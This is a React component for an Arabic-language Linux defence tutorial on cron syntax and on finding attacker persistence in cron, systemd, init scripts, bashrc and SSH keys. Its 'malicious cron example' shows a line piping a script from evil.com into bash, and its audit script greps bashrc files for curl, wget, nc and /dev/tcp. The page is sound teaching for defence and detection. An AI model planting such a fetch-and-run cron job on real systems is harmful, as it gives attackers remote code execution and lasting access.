import Alert from '../../components/Alert';
import CodeBlock from '../../components/CodeBlock';

const LinuxPersistenceSection = () => {
  return (
    <div className="space-y-8">
      <h1 className="text-3xl font-bold text-cyan-400 flex items-center gap-3">
        <span>🔄</span>
        المهام المجدولة Cron و Persistence
      </h1>

      <div className="h-1 w-32 bg-gradient-to-l from-cyan-500 to-transparent rounded"></div>

      <Alert type="danger" title="ما هو Persistence؟">
        طريقة المهاجم للبقاء في النظام بعد إعادة التشغيل. Cron من أشهر الطرق!
      </Alert>

      {/* Cron */}
      <section className="space-y-4">
        <h2 className="text-2xl font-bold text-white">ما هو Cron</h2>
        <p className="text-gray-300">نظام لجدولة تنفيذ الأوامر بشكل دوري.</p>

        <div className="bg-purple-900/20 rounded-xl p-6 border border-purple-500/30">
          <h3 className="text-purple-400 font-bold mb-4">صيغة Cron</h3>
          <CodeBlock
            code={`* * * * * command
│ │ │ │ │
│ │ │ │ └── يوم الأسبوع (0-7)
│ │ │ └──── الشهر (1-12)
│ │ └────── يوم الشهر (1-31)
│ └──────── الساعة (0-23)
└────────── الدقيقة (0-59)`}
          />
          <div className="mt-4 grid grid-cols-3 gap-2 text-sm">
            <div className="bg-gray-800/50 rounded p-2 text-center">
              <code className="text-green-400">*/5 * * * *</code>
              <p className="text-gray-400 text-xs">كل 5 دقائق</p>
            </div>
            <div className="bg-gray-800/50 rounded p-2 text-center">
              <code className="text-green-400">0 * * * *</code>
              <p className="text-gray-400 text-xs">كل ساعة</p>
            </div>
            <div className="bg-gray-800/50 rounded p-2 text-center">
              <code className="text-green-400">0 0 * * *</code>
              <p className="text-gray-400 text-xs">منتصف الليل</p>
            </div>
          </div>
        </div>
      </section>

      {/* أماكن Cron */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">أماكن المهام المجدولة</h2>

        <CodeBlock
          title="فحص مهام المستخدمين"
          code={`# مهام المستخدم الحالي
crontab -l

# مهام مستخدم محدد
crontab -u username -l

# مهام root
sudo crontab -l`}
        />

        <CodeBlock
          title="الملفات والمجلدات"
          code={`ls -la /etc/cron*

# الأماكن:
# /etc/crontab
# /etc/cron.d/
# /etc/cron.hourly/
# /etc/cron.daily/
# /etc/cron.weekly/
# /etc/cron.monthly/
# /var/spool/cron/crontabs/`}
        />

        <CodeBlock
          title="فحص شامل لكل المستخدمين"
          code={`for user in $(cut -f1 -d: /etc/passwd); do
  echo "=== Crontab for $user ==="
  crontab -u $user -l 2>/dev/null
done`}
        />
      </section>

      {/* علامات مشبوهة */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">🚨 علامات مشبوهة في Cron</h2>

        <div className="grid md:grid-cols-2 gap-4">
          <Alert type="danger">
            <ul className="space-y-2">
              <li>• مهمة تنفذ سكريبت من <code className="bg-gray-700 px-1 rounded">/tmp</code></li>
              <li>• مهمة تنزل ملف من الإنترنت ثم تنفذه</li>
              <li>• مهمة بأوامر base64 مشفرة</li>
              <li>• مهمة جديدة لم تنشئها أنت</li>
            </ul>
          </Alert>

          <div className="bg-red-900/20 rounded-xl p-4 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-3">مثال على cron خبيث</h3>
            <CodeBlock
              code={`*/5 * * * * curl http://evil.com/malware.sh | bash
*/10 * * * * /tmp/.hidden/backdoor`}
            />
          </div>
        </div>
      </section>

      {/* أماكن Persistence أخرى */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">أماكن Persistence أخرى يجب فحصها</h2>

        <div className="space-y-4">
          {/* Systemd */}
          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
            <h3 className="text-cyan-400 font-bold mb-4">1. Systemd Services</h3>
            <CodeBlock
              code={`systemctl list-units --type=service --state=running
ls -la /etc/systemd/system/
ls -la /lib/systemd/system/`}
            />
          </div>

          {/* Init scripts */}
          <div className="bg-gray-800/50 rounded-xl p-6 border border-gray-700">
            <h3 className="text-cyan-400 font-bold mb-4">2. سكريبتات بدء التشغيل</h3>
            <CodeBlock
              code={`ls -la /etc/init.d/
ls -la /etc/rc.d/
cat /etc/rc.local`}
            />
          </div>

          {/* Bashrc */}
          <div className="bg-yellow-900/20 rounded-xl p-6 border border-yellow-500/30">
            <h3 className="text-yellow-400 font-bold mb-4">3. Bashrc و Profile ⚠️</h3>
            <p className="text-gray-300 text-sm mb-4">المهاجمون يضيفون أوامرهم هنا لتنفيذها عند تسجيل دخول المستخدم!</p>
            <CodeBlock
              code={`cat ~/.bashrc
cat ~/.bash_profile
cat /etc/profile
cat /etc/bash.bashrc`}
            />
          </div>

          {/* SSH Keys */}
          <div className="bg-red-900/20 rounded-xl p-6 border border-red-500/30">
            <h3 className="text-red-400 font-bold mb-4">4. SSH authorized_keys 🚨</h3>
            <p className="text-gray-300 text-sm mb-4">مفاتيح SSH غير معروفة = نقطة دخول للمهاجم!</p>
            <CodeBlock
              code={`cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys
find / -name "authorized_keys" 2>/dev/null`}
            />
          </div>
        </div>
      </section>

      {/* سكريبت فحص شامل */}
      <section className="space-y-4 mt-12">
        <h2 className="text-2xl font-bold text-white">📋 سكريبت فحص Persistence شامل</h2>

        <CodeBlock
          title="احفظه كـ check-persistence.sh"
          code={`#!/bin/bash
echo "=== Checking Persistence Mechanisms ==="
echo ""

echo "[1] Cron Jobs:"
for user in $(cut -f1 -d: /etc/passwd); do
  crons=$(crontab -u $user -l 2>/dev/null)
  if [ -n "$crons" ]; then
    echo "  User: $user"
    echo "$crons" | sed 's/^/    /'
  fi
done

echo ""
echo "[2] System Cron Files:"
ls -la /etc/cron.d/ 2>/dev/null

echo ""
echo "[3] Suspicious RC Scripts:"
cat /etc/rc.local 2>/dev/null | grep -v "^#" | grep -v "^$"

echo ""
echo "[4] SSH Authorized Keys:"
find /home /root -name "authorized_keys" -exec echo "  Found: {}" \\; -exec cat {} \\; 2>/dev/null

echo ""
echo "[5] Suspicious Bashrc entries:"
grep -h "curl\\|wget\\|nc\\|/dev/tcp" /home/*/.bashrc /root/.bashrc 2>/dev/null

echo ""
echo "=== Check Complete ==="
`}
        />
      </section>
    </div>
  );
};

export default LinuxPersistenceSection;
